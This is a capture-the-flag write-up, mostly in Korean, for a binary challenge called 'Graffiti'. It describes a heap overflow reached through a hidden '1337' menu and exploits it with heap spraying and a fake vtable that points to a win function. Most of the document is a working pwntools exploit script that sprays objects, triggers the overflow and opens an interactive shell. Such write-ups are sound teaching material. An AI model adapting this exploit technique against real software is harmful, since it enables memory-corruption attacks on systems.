# Graffiti

# Usage

# Concept

- BOF, vtable overwrite, heap spray

# Writeup

## 취약점
힙 스프레이로 주소 예측 + fake vtable 컨셉이다.
1337을 입력하면 나오는 히든메뉴에서 취약점이 발생하여 힙 오버플로우가 발생한다.
이를 이용하여 다른 객체나 힙 메타데이터를 덮을 수 있다. \
leak 이 불가능하기 때문에 해당 문제는 힙 스프레이를 이용해서 vtable 을 덮어야한다. \
문제에서 별도의 타임아웃을 두고 있지 않기 때문에 많은 객체 할당을 통해서 주소를 예측한다. \
win 함수가 문제에 있기 때문에 fake vtable 을 win 함수로 구성하면 익스플로잇이 가능하다. 


 ## Exploit 
 ```py

from pwn import*
import re

def get_heap_address(pid):
    with open(f'/proc/{pid}/maps', 'r') as f:
        maps = f.read()
    
    # 힙 영역 찾기
    heap_match = re.search(r'([0-9a-f]+)-([0-9a-f]+).*\[heap\]', maps)
    if heap_match:
        heap_start = int(heap_match.group(1), 16)
        heap_end = int(heap_match.group(2), 16)
        return heap_start, heap_end
    return None, None

def normal(content):
    p.sendlineafter(b">", b"1")
    p.sendafter(b">", content)

def blue(content):
    p.sendlineafter(b">", b"2")
    p.sendafter(b">", content)

def red(content):
    p.sendlineafter(b">", b"3")
    p.sendafter(b">", content)

import time
while True:
    try:
        p = process("./graffiti")
        #p = remote("192.168.10.213", 15252)
        win = 0x40147c
        heap_addr = 0x2839013800
        #heap_addr = 0x41e40800
        fake_vtable = p64(win) * 8
        for i in range(4096 * 128):
            print(i)
            blue(fake_vtable)
        p.sendline(b'1337')
        p.sendafter(b'labeling', b'12')
        p.send(p64(heap_addr) * 100)
        '''
        # pause 직전에 힙 주소 읽기
        pid = p.pid
        heap_start, heap_end = get_heap_address(pid)
        if heap_start and heap_end:
            log.info(f"Process PID: {pid}")
            log.info(f"Heap start address: 0x{heap_start:x}")
            log.info(f"Heap end address: 0x{heap_end:x}")
            log.info(f"Heap size: 0x{heap_end - heap_start:x}")
            print(f"\n=== HEAP INFO ===")
            print(f"PID: {pid}")
            print(f"Heap Start: 0x{heap_start:x}")
            print(f"Heap End: 0x{heap_end:x}")
            print(f"Heap Size: 0x{heap_end - heap_start:x}")
            print(f"================\n")
        else:
            log.warning("힙 주소를 찾을 수 없습니다.")
        '''    
        pause()
        p.sendline(b'4')
        p.interactive()
    except Exception as e:
        log.error(f"Error: {e}")
        if 'p' in locals():
            p.close()
        continue

 ```